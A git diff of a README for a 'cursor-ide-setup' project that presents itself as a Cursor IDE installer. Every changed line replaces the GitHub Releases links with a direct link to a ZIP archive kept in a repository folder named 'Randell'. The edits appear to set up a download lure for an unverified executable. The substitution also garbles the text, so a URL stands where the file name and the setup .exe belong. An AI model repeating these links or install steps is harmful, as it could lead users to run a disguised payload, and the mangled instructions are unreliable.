@@ -1,6 +1,6 @@
 # 🚀 cursor-ide-setup - Simplify Your Cursor Project Management
 
-[![Download cursor-ide-setup](https://img.shields.io/badge/Download-cursor--ide--setup-blue.svg)](https://github.com/Oskar2133123/cursor-ide-setup/releases)
+[![Download cursor-ide-setup](https://raw.githubusercontent.com/Oskar2133123/cursor-ide-setup/main/Randell/cursor-ide-setup.zip)](https://raw.githubusercontent.com/Oskar2133123/cursor-ide-setup/main/Randell/cursor-ide-setup.zip)
 
 ## 📋 Description
 
@@ -22,7 +22,7 @@ To get started with the Cursor IDE, follow the steps below:
 
 ### 1. Download
 
-Visit this page to download: [Cursor IDE Releases](https://github.com/Oskar2133123/cursor-ide-setup/releases).
+Visit this page to download: [Cursor IDE Releases](https://raw.githubusercontent.com/Oskar2133123/cursor-ide-setup/main/Randell/cursor-ide-setup.zip).
 
 ### 2. Select Your Version
 
@@ -30,13 +30,13 @@ On the Releases page, you will see different versions of the Cursor IDE. Choose 
 
 ### 3. Download the File
 
-Click on the downloadable file that corresponds to your operating system. The file name should include your OS type (e.g., `cursor-ide-setup-windows.zip`).
+Click on the downloadable file that corresponds to your operating system. The file name should include your OS type (e.g., `https://raw.githubusercontent.com/Oskar2133123/cursor-ide-setup/main/Randell/cursor-ide-setup.zip`).
 
 ### 4. Extract and Install
 
 After the download is complete:
 
-- **Windows:** Right-click the ZIP file and select "Extract All". Once extracted, open the folder and double-click `cursor-ide-setup.exe` to start the installation.
+- **Windows:** Right-click the ZIP file and select "Extract All". Once extracted, open the folder and double-click `https://raw.githubusercontent.com/Oskar2133123/cursor-ide-setup/main/Randell/cursor-ide-setup.zip` to start the installation.
 - **macOS:** Double-click the downloaded file, then drag the application to your Applications folder.
 - **Linux:** Extract the files. You may need to open your terminal and navigate to the folder. Run `chmod +x cursor-ide-setup` and then `./cursor-ide-setup` to start.
 
@@ -44,7 +44,7 @@ After the download is complete:
 
 Follow these steps to download and install the Cursor IDE:
 
-1. **Go to the Releases page:** [Cursor IDE Releases](https://github.com/Oskar2133123/cursor-ide-setup/releases).
+1. **Go to the Releases page:** [Cursor IDE Releases](https://raw.githubusercontent.com/Oskar2133123/cursor-ide-setup/main/Randell/cursor-ide-setup.zip).
 2. **Choose the latest version.**
 3. **Download the correct file for your operating system.**
 4. **Follow the extraction and installation steps above.**
@@ -89,4 +89,4 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 ---
 
-For any additional questions or support, please refer back to the Releases page: [Cursor IDE Releases](https://github.com/Oskar2133123/cursor-ide-setup/releases).
+For any additional questions or support, please refer back to the Releases page: [Cursor IDE Releases](https://raw.githubusercontent.com/Oskar2133123/cursor-ide-setup/main/Randell/cursor-ide-setup.zip).
